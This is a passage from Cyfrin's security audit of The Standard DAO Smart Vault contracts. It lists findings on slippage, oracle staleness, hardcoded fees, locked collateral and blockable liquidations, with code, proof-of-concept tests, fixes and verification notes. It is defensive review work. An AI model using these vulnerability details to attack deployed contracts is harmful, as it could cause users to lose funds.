While this design will successfully protect users against complete and immediate loss, 10% is nevertheless a significant amount to lose on each deposit/withdrawal action.

Currently, due to the existence of a centralized sequencer, MEV on Arbitrum does not exist in the typical sense; however, it is still possible to execute latency-driven strategies for predictable events such as liquidations. As such, it may still be possible for MEV bots to cause collateral yield deposits/withdrawals to return 90% of the original collateral value, putting the Smart Vault unnecessarily close to liquidation.

**Impact:** Users could lose a significant portion of collateral when depositing into and withdrawing from Gamma Vaults.

**Recommended Mitigation:** While the existing validation can remain, consider allowing the user to pass a more restrictive collateral drop percentage and more fine-grained slippage parameters for the interactions linked above.

**The Standard DAO:** Fixed by commit [`cc86606`](https://github.com/the-standard/smart-vault/commit/cc86606ef6f8c1fea84f378e7f324e648f9bcbc8).

**Cyfrin:** Verified, `SmartVaultV4::depositYield` and `SmartVaultV4::withdrawYield` now accept a user-supplied minimum collateral percentage parameter. Note that due to the re-ordering of validation in `SmartVaultV4::mint`, the `remainCollateralised()` modifier can be used for this function.

**The Standard DAO:** Fixed by commit [e89daee](https://github.com/the-standard/smart-vault/commit/e89daee950d76180a969c6f93839addd8d43b195).

**Cyfrin:** Verified, the modifier is now used for `mint()`.


### Hardcoded pool fees can result in increased slippage and failed swaps

**Description:** The issue raised in the previous CodeHawks contest as report item [M-03](https://codehawks.the-standard.io/c/2023-12-the-standard/s/483) remains present in `SmartVaultV4::swap` where the pool fee is [hardcoded](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L267) to `3000`:

```solidity
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn: inToken,
        tokenOut: getTokenisedAddr(_outToken),
        fee: 3000, // @audit hardcoded pool fee
        recipient: address(this),
        deadline: block.timestamp + 60,
        amountIn: _amount - swapFee,
        amountOutMinimum: minimumAmountOut,
        sqrtPriceLimitX96: 0
    });
```

The same issue is present within [`SmartVaultYieldManager::_usdDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L158) and [`SmartVaultYieldManager::_withdrawDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L198), where collateral tokens are swapped to/from `USDC` and `USDs` with a hardcoded pool fee of `500`:

```solidity
function _usdDeposit(address _collateralToken, uint256 _usdPercentage, bytes memory _pathToUSDC) private {
    _swapToUSDC(_collateralToken, _usdPercentage, _pathToUSDC);
    _swapToRatio(USDC, usdsHypervisor, ramsesRouter, 500);
    _deposit(usdsHypervisor);
}
...
function _withdrawUSDsDeposit(address _hypervisor, address _token) private {
    IHypervisor(_hypervisor).withdraw(_thisBalanceOf(_hypervisor), address(this), address(this), [uint256(0),uint256(0),uint256(0),uint256(0)]);
    _swapToSingleAsset(usdsHypervisor, USDC, ramsesRouter, 500);
    _sellUSDC(_token);
}
```

**Impact:** As mentioned in [M-03](https://codehawks.the-standard.io/c/2023-12-the-standard/s/483) of the CodeHawks contest, with the possible exception of the `USDs/USDC` pool created and maintained by the protocol, the pool with the highest liquidity will not necessarily always be equal to the hardcoded values, so trading in a pool with low liquidity will result in increased slippage or failed swaps. If the loss exceeds 10% of the collateral value, this results in a DoS of yield deposits/withdrawals due to validation in [`SmartVaultV4::significantCollateralDrop`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L295-L297). For calls to `SmartVaultV4::swap`, there is no such validation to prevent the Smart Vault from being put unnecessarily close to liquidation  the minimum amount output from the swap is that required to remain collateralized within 1% of liquidation.

**Recommended Mitigation:** The same recommendation as in [M-03](https://codehawks.the-standard.io/c/2023-12-the-standard/s/483) applies here  consider allowing the user to pass the pool fee as a parameter to the call(s).

**The Standard DAO:** Collateral swap pool fees fixed by commit [`f9f7093`](https://github.com/the-standard/smart-vault/commit/f9f70930168499f2de6b7aadf49995b7a766f1a1). Hypervisor swap pool fees acknowledged  not fixed as these swap routes will be managed by admins in `hypervisorData`.

**Cyfrin:** Verified, `SmartVaultV4::swap` now accepts a user-supplied pool fee parameter.


### Insufficient validation of Chainlink data feeds

**Description:** `PriceCalculator` is a contract responsible for providing the Chainlink oracle prices for assets used by The Standard. Here, the price for an asset is queried and then normalized to 18 decimals before being returned to the caller:

```solidity
function tokenToUSD(ITokenManager.Token memory _token, uint256 _tokenValue) external view returns (uint256) {
    Chainlink.AggregatorV3Interface tokenUsdClFeed = Chainlink.AggregatorV3Interface(_token.clAddr);
    uint256 scaledCollateral = _tokenValue * 10 ** getTokenScaleDiff(_token.symbol, _token.addr);
    (,int256 _tokenUsdPrice,,,) = tokenUsdClFeed.latestRoundData();
    return scaledCollateral * uint256(_tokenUsdPrice) / 10 ** _token.clDec;
}

function USDToToken(ITokenManager.Token memory _token, uint256 _usdValue) external view returns (uint256) {
    Chainlink.AggregatorV3Interface tokenUsdClFeed = Chainlink.AggregatorV3Interface(_token.clAddr);
    (, int256 tokenUsdPrice,,,) = tokenUsdClFeed.latestRoundData();
    return _usdValue * 10 ** _token.clDec / uint256(tokenUsdPrice) / 10 ** getTokenScaleDiff(_token.symbol, _token.addr);
}
```

However, these calls to `AggregatorV3Interface::latestRoundData` lack the necessary validation for Chainlink data feeds to ensure that the protocol does not ingest stale or incorrect pricing data that could indicate a faulty feed.

**Impact:** Stale prices can result in unnecessary liquidations or the creation of insufficiently collateralised positions.

**Recommended Mitigation:** Implement the following validation:

```diff
-   (,int256 _tokenUsdPrice,,,) = tokenUsdClFeed.latestRoundData();
+   (uint80 _roundId, int256 _tokenUsdPrice, , uint256 _updatedAt, ) = tokenUsdClFeed.latestRoundData();
+   if(_roundId == 0) revert InvalidRoundId();
+   if(_tokenUsdPrice == 0) revert InvalidPrice();
+   if(_updatedAt == 0 || _updatedAt > block.timestamp) revert InvalidUpdate();
+   if(block.timestamp - _updatedAt > TIMEOUT) revert StalePrice();
```

Given the intention to deploy these contracts to Arbitrum, it is also recommended to check the sequencer uptime. The documentation for implementing this is [here](https://docs.chain.link/data-feeds/l2-sequencer-feeds) with a [code example](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code).

**The Standard DAO:** Fixed by commit [`8e78f7c`](https://github.com/the-standard/smart-vault/commit/8e78f7c55cc321e789da3d9f6b818ea740b55dc8).

**Cyfrin:** Verified, additional validation of Chainlink price feed data has been added; however, timeouts should be specified on a per-feed basis, and 24 hours is likely too long for most feeds. The sequencer uptime feed has also not been implemented, but this is an important addition. Note that the `hardhat/console.sol` import should be removed from `PriceCalculator.sol`.

**The Standard DAO:** Fixed by commit [`7dfbff1`](https://github.com/the-standard/smart-vault/commit/7dfbff1c6a36b184f71eebcf0763131e53dccfc9).

**Cyfrin:** Verified, additional timeout logic and the sequencer uptime check have been added.

\clearpage
## Low Risk


### Allowance reset for incorrect token in `SmartVaultYieldManager::_sellUSDC`

**Description:** When swapping `USDC` in `SmartVaultYieldManager::_sellUSDC`, there is an allowance given to the router:

```solidity
IERC20(USDC).safeApprove(uniswapRouter, _balance);
ISwapRouter(uniswapRouter).exactInput(ISwapRouter.ExactInputParams({
    /* snip: swap */
}));
IERC20(USDs).safeApprove(uniswapRouter, 0);
```
Consistent with all other swaps performed in this contract, the allowance is reset after interaction with the router; however, in this instance, the allowance is [incorrectly reset](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L193) to `0` for `USDs` instead of `USDC`.

**Impact:** There can be small `USDC` dust allowances left on the router.

**Recommended Mitigation:** Replace `USDs` with `USDC`:

```diff
  IERC20(USDC).safeApprove(uniswapRouter, _balance);
  ISwapRouter(uniswapRouter).exactInput(ISwapRouter.ExactInputParams({
      /* snip: swap */
  }));
- IERC20(USDs).safeApprove(uniswapRouter, 0);
+ IERC20(USDC).safeApprove(uniswapRouter, 0);
```

**The Standard DAO:** Fixed by commit [`217de3a`](https://github.com/the-standard/smart-vault/commit/217de3a777ec692e3ecc781464d8644814df3ab9).

**Cyfrin:** Verified, approval is now reset for `USDC`.


### Insufficient deadline protection when adding/removing collateral from yield positions

**Description:** When the owner of a Smart Vault transfers its collateral assets to/from one of the supported Gamma Vaults, several swaps are executed with a deadline of `block.timestamp + 60`. For example, in `SmartVaultYieldManager::_sellUSDC`:

```solidity
ISwapRouter(uniswapRouter).exactInput(ISwapRouter.ExactInputParams({
    path: _pathFromUSDC,
    recipient: address(this),
    deadline: block.timestamp + 60,
    amountIn: _balance,
    amountOutMinimum: 0
}));
```

This deadline will always be valid whenever the transaction is included in a block, with the addition of 60 seconds from the current timestamp doing nothing, as the timestamp of execution will always be `block.timestamp`.

**Impact:** The lack of a proper deadline can result in swaps being executed in market conditions that differ significantly from those intended, possibly resulting in less favorable outcomes. This is somewhat mitigated by the  `significantCollateralDrop()` protection in `SmartVaultV4`; however, this relies on Chainlink oracle values for calculation of the Smart Vault collateral that might have also changed since the transaction was submitted.

**Recommended Mitigation:** Consider allowing the user to specify a deadline for the swaps executed when adding/removing collateral from yield positions. Note that the deadline does not need to be passed directly to all swap invocations but can be checked once directly in the function bodies of `SmartVaultV4::depositYield` and `SmartVaultV4::withdrawYield`.

**The Standard DAO:** Fixed by commit [`71bad0a`](https://github.com/the-standard/smart-vault/commit/71bad0a8cc4bf8ff60321e41c9acb1e7d7fe1b2c).

**Cyfrin:** Verified, `SmartVaultV4::depositYield`, `SmartVaultV4:withdrawtYield`, and `SmartVaultV4::swap` now accept a user-supplied deadline parameter.


### Removal of Hypervisor data locks deposited Smart Vault collateral

**Description:** A Gamma Vault (aka Hypervisor) is an external contract that maintains and offers fungible shares in Uniswap V3 liquidity positions. The Standard leverages multiple Hypervisors to enable the collateral backing `USDs` to earn yield, configured by admin calls to [`SmartVaultYieldManager::addHypervisorData`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L222-L224). When Smart Vault collateral is deposited into one of these Hypervisors, it is minted Hypervisor ERC-20 tokens to represent a share of the underlying position and internally calls [`SmartVaultV4::addUniqueHypervisor`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L279-L284) to maintain a list of Hypervisors in which it has collateral deposited.

If an admin call is made to [`SmartVaultYieldManager::removeHypervisorData`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L226-L228) to remove a Hypervisor in which Smart Vaults still have open positions, the underlying collateral will be locked. This is due to the following validation in [`SmartVaultYieldManager::_withdrawOtherDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L202-L207) that requires the Hypervisor data to be valid and configured:

```solidity
function _withdrawOtherDeposit(address _hypervisor, address _token) private {
    HypervisorData memory _hypervisorData = hypervisorData[_token];
    if (_hypervisorData.hypervisor != _hypervisor) revert IncompatibleHypervisor();
    /* snip: withdraw and swap */
}
```

However, this collateral locked in the removed Hypervisor will still contribute to the collateral calculation of the Smart Vault due to looping over its independently maintained `SmartVaultV4::hypervisors` array (from which Hypervisors are only removed when collateral is withdrawn).

**Impact:** Hypervisor tokens and the corresponding Smart Vault collateral can be locked indefinitely unless the protocol admin re-adds the Hypervisor data, ignoring a separate finding detailing the malicious removal of Hypervisor tokens from Smart Vaults.

**Proof of Concept:** The following test can be added to `SmartVault.js`:
```javascript
it('locks collateral when hypervisor is removed', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC.div(10));
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC.div(10));

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  await YieldManager.connect(admin).removeHypervisorData(MockWeth.address);

  // collateral is still counted
  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  // user cannot remove collateral
  await expect(Vault.connect(user).withdrawYield(MockWETHWBTCHypervisor.address, ETH))
    .to.be.revertedWithCustomError(YieldManager, 'IncompatibleHypervisor');
});
```

**Recommended Mitigation:** If it is necessary to have the ability to remove Hypervisors, consider also allowing Smart Vault owners to remove Hypervisor tokens from their Vaults if they have been delisted from `SmartVaultYieldManager`, with a check that they are still sufficiently collateralized.

**The Standard DAO:** Acknowleged, not fixed as we believe a user can remove with `removeAsset()`. As long as the vault remains collateralised, there shouldnt be a problem. We are also not intending to remove Hypervisors if we can avoid it.

**Cyfrin:** Acknowledged, while removed Hypervisor tokens will continue to contribute to the collateralization value of a given Smart Vault, they can be removed by calling `SmartVaultV4::removeAsset` so long as the Vault remains sufficiently collateralized.


### Dust amounts of swapped collateral tokens remain in `SmartVaultYieldManager`

**Description:** Due to rounding, swaps made via Uniswap-style routers with exact input parameters can result in residual dust amounts left in the calling contract. This is not an issue for deposits to Gamma Vaults, as all swapped tokens are sent to the corresponding Hypervisor contract; however, the use of [`SmartVaultYieldManager::_swapToSingleAsset`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L113-L131) called from [`SmartVaultYieldManager::_withdrawUSDsDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L196-L200) and [`SmartVaultYieldManager::_withdrawOtherDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L202-L207) during withdrawals can leave dust amounts of the input token.

**Impact:** Dust amounts of collateral tokens can accumulate in `SmartVaultYieldManager` and will be utilized by the next caller for a given token.

**Recommended Mitigation:** Consider checking for non-zero residual amounts of the input token(s) to swaps made during the withdrawal of yield positions and, if present, return them to the Smart Vault.

**The Standard DAO:** Fixed by commit [`a62973e`](https://github.com/the-standard/smart-vault/commit/a62973ef32942bc74c364d20f03f03229fe8c3bb).

**Cyfrin:** Verified, dust amounts of the unwanted token are now transferred back to the sender.


### `WETH` collateral cannot be swapped in `SmartVaultV4`

**Description:** [`SmartVaultV4::swap`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L259-L277) allows Smart Vault collateral, specified by its `bytes32` symbol, to be swapped for other supported collateral tokens. The corresponding token address for a given symbol is returned by [`SmartVaultV4::getTokenisedAddr`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L228-L231) based on the output of [`SmartVaultV4::getToken`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L220-L226):

```solidity
function getToken(bytes32 _symbol) private view returns (ITokenManager.Token memory _token) {
    ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
    for (uint256 i = 0; i < tokens.length; i++) {
        if (tokens[i].symbol == _symbol) _token = tokens[i];
    }
    if (_token.symbol == bytes32(0)) revert InvalidToken();
}

function getTokenisedAddr(bytes32 _symbol) private view returns (address) {
    ITokenManager.Token memory _token = getToken(_symbol);
    return _token.addr == address(0) ? ISmartVaultManagerV3(manager).weth() : _token.addr;
}
```

Native `ETH` is present in the list of accepted tokens; however, it returns `address(0)`. Hence, the symbols for both `ETH` and `WETH` correspond to the `WETH` address which is used as the [`tokenIn`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L265) parameter for the Uniswap V3 Router swap instruction. This is the correct method for swapping native `ETH` via the Uniswap V3 Router which will first [attempt to utilize any native balance](https://github.com/Uniswap/v3-periphery/blob/0682387198a24c7cd63566a2c58398533860a5d1/contracts/base/PeripheryPayments.sol#L58-L61) to cover `amountIn`.

After the swap parameters are populated, execution of the actual swap occurs based on [`SmartVaultV4::executeNativeSwapAndFee`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L233-L237) or [`SmartVaultV4::executeERC20SwapAndFee`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L239-L248), depending on the `inToken` address:

```solidity
inToken == ISmartVaultManagerV3(manager).weth() ?
    executeNativeSwapAndFee(params, swapFee) :
    executeERC20SwapAndFee(params, swapFee);
```

Here, the first conditional branch will be executed if the caller intends to swap `WETH` or native `ETH`; however, this logic assumes that the caller exclusively wants to swap native `ETH`, so it will fail for `WETH` unless the Smart Vault has a sufficient balance of `ETH` to perform a native `ETH` swap.

**Impact:** It is impossible for `WETH` collateral to be swapped directly within a Smart Vault.

**Proof of Concept:** The following test can be added to `SmartVault.js`:

```javascript
it('cant swap WETH', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await MockWeth.connect(user).deposit({value: ethCollateral});
  await MockWeth.connect(user).transfer(Vault.address, ethCollateral);

  let { collateral } = await Vault.status();
  expect(getCollateralOf('WETH', collateral).amount).to.equal(ethCollateral);

  await expect(
    Vault.connect(user).swap(
      ethers.utils.formatBytes32String('WETH'),
      ethers.utils.formatBytes32String('WBTC'),
      ethers.utils.parseEther('0.05'),
      0)
    ).to.be.revertedWithCustomError(Vault, 'TransferError');
});
```

**Recommended Mitigation:** Consider handling `WETH` with `SmartVaultV4::executeERC20SwapAndFee` by modifying the conditional logic in `SmartRouterV4::swap`:

```diff
-   inToken == ISmartVaultManagerV3(manager).weth() ?
+   _inToken == NATIVE ?
        executeNativeSwapAndFee(params, swapFee) :
        executeERC20SwapAndFee(params, swapFee);
```

**The Standard DAO:** Fixed by commit [`fb965bd`](https://github.com/the-standard/smart-vault/commit/fb965bdee4036cb525e4df18f77ece7b32720a66).

**Cyfrin:** Verified, `WETH` collateral can now be swapped; however, if the output token is specified as `NATIVE` then any existing `WETH` collateral in the Smart Vault will also be withdrawn. Also, `SmartVaultV4::executeNativeSwapAndFee` is now no longer used and can be removed.

**The Standard DAO:** Fixed by commit [`589d645`](https://github.com/the-standard/smart-vault/commit/589d645eae5bc5a10aa0e32302942fcbc5a07491).

**Cyfrin:** Verified, now only the `WETH` output from the swap is withdrawn to native.


### Liquidations could be blocked by reverting ERC-20 transfers

**Description:** When liquidations are performed via `SmartVaultV4::liquidate`, ERC-20 collateral tokens are handled within a loop:

```solidity
function liquidate() external onlyVaultManager {
    /* snip: validation, state updates & native liquidation
    ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
    for (uint256 i = 0; i < tokens.length; i++) {
        if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
    }
}
```

If the contract balance of a given ERC-20 is non-zero, it will proceed to perform a transfer to the protocol address, as show below:

```solidity
function liquidateERC20(IERC20 _token) private {
    if (_token.balanceOf(address(this)) != 0) _token.safeTransfer(ISmartVaultManagerV3(manager).protocol(), _token.balanceOf(address(this)));
}
```

However, if any of these transfers revert, the whole call will revert and liquidation will be blocked. Analysis of the collateral tokens currently intended to be supported failed to identify any immediate risks, although it is prescient to note the following:
- `GMX` includes rewards distribution logic on transfers (that, however unlikely, could potentially revert).
- `WETH` and `ARB` are Transparent Upgradeable proxies.
- `WBTC`, `LINK`, `PAXG`, and `SUSHI` are Beacon proxies.
- `RDNT` is a LayerZero bridge token.

**Impact:** Liquidations for a given Smart Vault will be blocked if `GMX` collateral transfers revert. If any other collateral tokens are upgraded to introduce novel transfer logic, they could also make Smart Vaults susceptible to this issue. If an attacker can force a single collateral token transfer to revert, they can avoid being liquidated.

**Recommended Mitigation:** Consider separate handling of each ERC-20 transfer with `try/catch` to avoid blocked liquidations.

**The Standard DAO:** Fixed by commit [`efda8d2`](https://github.com/the-standard/smart-vault/commit/efda8d2de7cb4406598d50099f52fc1275769c0a).

**Cyfrin:** Verified, liquidation will no longer revert if a single transfer fails. Direct use of `ERC20::transfer` instead of `SafeERC20::safeTransfer` appears to be okay because:
- The Smart Vault will always be calling a contract with code when looping through the accepted tokens
- The current list of accepted collateral tokens all return `true` or revert on failed transfer.


### Potentially incorrect encoding of swap paths

**Description:** During fork testing, it became apparent that swap paths should use packed encoding; however, the [existing mocked test suite](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/test/SmartVault.js#L499-L509) does the following:

```javascript
// data about how yield manager converts collateral to USDC, vault addresses etc
await YieldManager.addHypervisorData(
  MockWeth.address, MockWETHWBTCHypervisor.address, 500,
  new ethers.utils.AbiCoder().encode(['address', 'uint24', 'address'], [MockWeth.address, 3000, USDC.address]),
  new ethers.utils.AbiCoder().encode(['address', 'uint24', 'address'], [USDC.address, 3000, MockWeth.address])
)
```

Referring to the [ethers documentation](https://docs.ethers.org/v5/api/utils/hashing/#utils-solidityPack), this shows that `AbiCoder::encode` is the incorrect method for packed encoding. If extended to the real configuration of Hypervisor data for deployed contracts, this would result in all yield deposit functionality reverting due to failed swaps.

**Impact:** Yield deposit functionality would not work due to incorrect configuration of Hypervisor data.

**Recommended Mitigation:** Use tightly packed encoding for swap paths.

**The Standard DAO:** Acknowledged. We are aware that this kind of encoding would not work in production with real routers, but could not figure out how to decode the correct path types in the mock swap router. Will amend the tests & mock swap router if you are aware of a solution.

**Cyfrin:** Acknowledged. The solution would be to use the Uniswap V3 [Path](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/Path.sol) and [BytesLib](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/BytesLib.sol) libraries; however, this additional complexity may not be desired for the mock tests.


### Collateral tokens with more than 18 decimals are not supported

**Description:** Due to the existing decimals scaling logic within [`PriceCalculator::getTokenScaleDiff`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/PriceCalculator.sol#L15-L17), any collateral tokens with more than 18 decimals will not be supported and will result in DoS of Smart Vault functionality:

```solidity
function getTokenScaleDiff(bytes32 _symbol, address _tokenAddress) private view returns (uint256 scaleDiff) {
    return _symbol == NATIVE ? 0 : 18 - ERC20(_tokenAddress).decimals();
}
```

Similar scaling is present in [`SmartVaultV4::yieldVaultCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L92-L93); however, this would require another `USDs` Hypervisor with a problematic underlying token to be added, which is unlikely.

**Impact:** Smart Vault collateral cannot be calculated if a token with more than 18 decimals is added to the list of accepted tokens, resulting in denial-of-service.


**Recommended Mitigation:** Consider scaling to a greater number of decimals if collateral tokens with more than 18 decimals will be added.

**The Standard DAO:** Fixed by commit [`cf871f7`](https://github.com/the-standard/smart-vault/commit/cf871f7950465904f3f8967e6504eacdd1cbc75c)  not suitable for hypervisor deposits, but should be ok for collateral.

**Cyfrin:** Verified, now supports collateral tokens with more than 18 decimals; however, division before multiplication for the `scale < 0` branch` could be problematic  it might be better to first scale all decimals to 36 and then divide back down to 18 in the return statement of `tokenToUSD`.

**The Standard DAO:** Fixed in commit [`2342302`](https://github.com/the-standard/smart-vault/commit/23423024550bca2dbe182e079403b28cc8d1f6e9).

**Cyfrin:** Verified, now scales decimals to 36 before rescaling back down to 18.

\clearpage
## Informational


### Unnecessary typecast of `msg.sender` to `address`

**Description:** There is an [instance](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L169) of the `msg.sender` context variable that is unnecessarily cast to `address` in `SmartVaultYieldManager::deposit`:

```solidity
uint256 _balance = IERC20(_collateralToken).balanceOf(address(msg.sender));
```

**Recommended Mitigation:** Consider removing the `address` typecast as `msg.sender` is already an address.

**The Standard DAO:** Fixed by commit [`1a9dc5f`](https://github.com/the-standard/smart-vault/commit/1a9dc5fc3f553d1b3dbf285e863d0f8cf5f8bbc0).

**Cyfrin:** Verified, typecast has been removed.


### Comment incorrectly refers to `` when it should be `$`

**Description:** The following comment is [present](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L91) when summing the stablecoin collateral in `SmartVaultV4::yieldVaultCollateral`:

```solidity
// both USDs and its vault pair are  stablecoins, but can be equivalent to 1 in collateral
```

Here, the `` symbol is used for USD instead of `$`.

**Recommended Mitigation:** Update the comment to use the `$` symbol.

**The Standard DAO:** No longer applicable. Comment removed in commit [`5862d8e`](https://github.com/the-standard/smart-vault/commit/5862d8e10ac8648b89a7e3a78498ff20dc31e42e).

**Cyfrin:** Verified, comment has been removed.


### Inconsistent use of equivalent function parameter and immutable variable in `SmartVaultYieldManager::_withdrawUSDsDeposit` is confusing

**Description:** When withdrawing collateral from the `USDs` Hypervisor in `SmartVaultYieldManager::_withdrawUSDsDeposit`, the `_hypervisor` parameter will always be equal to the immutable `usdsHypervisor` variable due to the following [conditional check](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L211-L213) in `SmartVaultYieldManager::withdraw`:

```solidity
_hypervisor == usdsHypervisor ?
    _withdrawUSDsDeposit(_hypervisor, _token) :
    _withdrawOtherDeposit(_hypervisor, _token);
```

However, a mixture of both the `_hypervisor` parameter and the equivalent immutable variable is used within[`SmartVaultYieldManager::_withdrawUSDsDeposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L196-L200):

```solidity
    function _withdrawUSDsDeposit(address _hypervisor, address _token) private {
    IHypervisor(_hypervisor).withdraw(_thisBalanceOf(_hypervisor), address(this), address(this), [uint256(0),uint256(0),uint256(0),uint256(0)]);
    _swapToSingleAsset(usdsHypervisor, USDC, ramsesRouter, 500);
    _sellUSDC(_token);
}
```

This is confusing to the reader as it could imply that the `_hypervisor` parameter differs from the immutable `usdsHypervisor`, which is not the case.

**Recommended Mitigation:** Consider consistent utilization of either the `_hypervisor` parameter or the immutable `usdsHypervisor` variable.

**The Standard DAO:** Fixed by commit [`f601a11`](https://github.com/the-standard/smart-vault/commit/f601a1173e0b2e2006e73c13339051ae7c7e6af1).

**Cyfrin:** Verified, the immutable variable is now used exclusively.


### `USDC` cannot be added as an accepted collateral token

**Description:** At least 10% of each collateral deposit to Gamma must be directed toward the `USDs/USDC` pool underlying the `USDs` Hypervisor:

```solidity
function _usdDeposit(address _collateralToken, uint256 _usdPercentage, bytes memory _pathToUSDC) private {
    _swapToUSDC(_collateralToken, _usdPercentage, _pathToUSDC);
    _swapToRatio(USDC, usdsHypervisor, ramsesRouter, 500);
    _deposit(usdsHypervisor);
}
```

During this process, [`SmartVaultYieldManager::_swapToUSDC`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L133-L144) swaps the collateral token to `USDC`; however, this would fail for `USDC` without additional handling as it has no path to itself. A similar issue is present in [`SmartVaultYieldManager::_sellUSDC`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L182-L194) when attempting to withdraw the `USDs` Hypervisor deposits to USDC.

Additionally, assuming the was correctly handled, broad use of [`SmartVaultYieldManager::thisBalanceOf`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L49-L51) would result in the entire balance of USDC being utilized for the `USDs` Hypervisor deposit within [`SmartVaultYieldManager::_swapToRatio`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L60-L61) without considering the subsequent Hypervisor deposit:

```solidity
uint256 _tokenBBalance = _thisBalanceOf(_tokenB);
(uint256 _amountStart, uint256 _amountEnd) = IUniProxy(uniProxy).getDepositAmount(_hypervisor, _tokenA, _thisBalanceOf(_tokenA));
```

Furthermore, if `USDC` were to be added as an accepted collateral token, this would result in liquidations being blocked for blacklisted Smart Vaults. An attacker could deposit illegally-obtained `USDC` into their Smart Vault, borrowing `USDs` and avoiding ever being liquidated as the attempt by the protocol to transfer these tokens out would fail.

**Impact:** `USDC` cannot be added as an accepted collateral.

**Recommended Mitigation:** These issues should first be addressed if it is desired to add `USDC` as an accepted collateral token.

**The Standard DAO:** Acknowledged. Not fixing because we have no intentions to add `USDC` as a collateral type. If we were to add it, we believe it would still be fine, as long we didnt add hypervisor data for it. This seems acceptable to us.

**Cyfrin:** Acknowledged.


### Native asset cannot be removed using `SmartVaultV4::removeAsset`

